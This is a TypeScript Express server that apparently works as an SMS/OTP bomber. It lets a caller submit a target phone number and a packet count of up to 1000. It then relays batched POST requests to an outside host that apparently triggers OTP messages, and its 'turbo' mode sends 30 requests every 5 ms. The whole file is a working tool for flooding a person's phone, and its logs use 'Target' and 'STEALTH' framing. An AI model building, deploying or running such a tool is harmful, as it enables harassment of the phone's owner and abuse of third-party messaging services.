import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import { fileURLToPath } from "url";
import crypto from "crypto";
import cors from "cors";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function startServer() {
  const app = express();
  // IMPORTANT: Use process.env.PORT (parsed as number) for external hosting
  const PORT = Number(process.env.PORT) || 3000;

  app.use(cors());
  app.use(express.json());
  app.use(express.urlencoded({ extended: true }));

  // Simple in-memory rate limiting
  const rateLimitMap = new Map<string, number>();

  // Global Request Logger
  app.use((req, res, next) => {
    console.log(`[REQ] ${new Date().toISOString()} | ${req.method} ${req.url}`);
    next();
  });

  // Health check to verify server is alive
  app.get("/api/ping", (req, res) => {
    res.json({ status: "ALIVE", timestamp: new Date().toISOString() });
  });

  // API Routes
  app.post("/api/otp/request", async (req, res) => {
    const { 
      mobile, 
      custom_sms,
      count,
      mode,
      ...techData
    } = req.body;
    
    const ip = req.ip || "unknown";
    const anonymizedIp = ip.replace(/\d+$/, "xxx"); 
    
    // Strict Validation
    const mobileNum = String(mobile || "").replace(/\D/g, "");
    if (mobileNum.length < 10) {
      return res.status(400).json({ 
        error: "VALIDATION_ERROR", 
        msg: "Target signature must be exactly 10 digits." 
      });
    }

    // Hash_Seed Verification / Logic
    const seed = custom_sms || "AUTO_GEN";
    const seedHash = crypto.createHash('sha256').update(seed + mobile).digest('hex').slice(0, 16);

    const requestCount = Math.min(Math.max(parseInt(count) || 1, 1), 1000); 
    const isTurbo = mode === "turbo";
    
    // Rate limiting: 2 seconds cooldown
    const now = Date.now();
    const lastRequestTime = rateLimitMap.get(ip) || 0;
    if (now - lastRequestTime < 2000) {
      return res.status(429).json({ 
        error: "FIREWALL_ACTIVE",
        msg: "Cluster stabilization in progress. Wait 2s."
      });
    }
    rateLimitMap.set(ip, now);

    try {
      console.log(`[V5.4_NODE] [${seedHash}] Target: ${mobileNum} | Pkts: ${requestCount} | Mode: ${isTurbo ? 'TURBO' : 'STEALTH'}`);

      // Forwarding Logic
      const params = new URLSearchParams();
      params.append("mobile", mobileNum);
      params.append("custom_sms", custom_sms || "XfsoCeXADQAg");
      // Add other data if proxy expects it
      Object.entries(techData).forEach(([k, v]) => {
        if (typeof v === 'object') params.append(k, JSON.stringify(v));
        else params.append(k, String(v));
      });

      const fireRequest = async () => {
        try {
          await fetch("https://black-devil-2gwh.onrender.com/", {
            method: "POST",
            headers: { 
              "Content-Type": "application/x-www-form-urlencoded",
              "X-Shatarudra-Protocol": "V5.4-PROTO-TLS",
              "X-Seed-Hash": seedHash
            },
            body: params.toString(),
            signal: AbortSignal.timeout(5000) 
          });
        } catch (e) { /* silent catch */ }
      };

      // Batching
      const batchSize = isTurbo ? 30 : 5;
      const delay = isTurbo ? 5 : 400; 

      (async () => {
        for (let i = 0; i < requestCount; i += batchSize) {
          const promises = Array.from({ length: Math.min(batchSize, requestCount - i) }).map(() => fireRequest());
          await Promise.all(promises);
          if (i + batchSize < requestCount) await new Promise(r => setTimeout(r, delay));
        }
        console.log(`[V5.4_NODE] Session concluded for target ${mobileNum}`);
      })().catch(console.error);

      res.json({
        status: "STABLE",
        metadata: {
          session_id: seedHash,
          packets: requestCount,
          target: mobileNum,
          protocol: "V5.4-TLS-SYNC"
        }
      });

    } catch (err: any) {
      console.error("GATEWAY_SYNC_ERROR:", err);
      res.status(500).json({ error: "INTERNAL_CORE_LEAK", msg: "Infrastructure sync failed." });
    }
  });

  // Catch-all API error to prevent HTML/404 ambiguity
  app.use("/api/*", (req, res) => {
    console.log(`[API_404] No route for ${req.method} ${req.url}`);
    res.status(404).json({ 
      error: "ENDPOINT_UNREACHABLE", 
      requested_path: req.url,
      method: req.method,
      server_time: new Date().toISOString()
    });
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`[SYSTEM_LOADED] Shatarudra Core V5.4 operational`);
    console.log(`[GATEWAY_DEBUG] Port: ${PORT} | API Base: /api`);
  });
}

startServer();
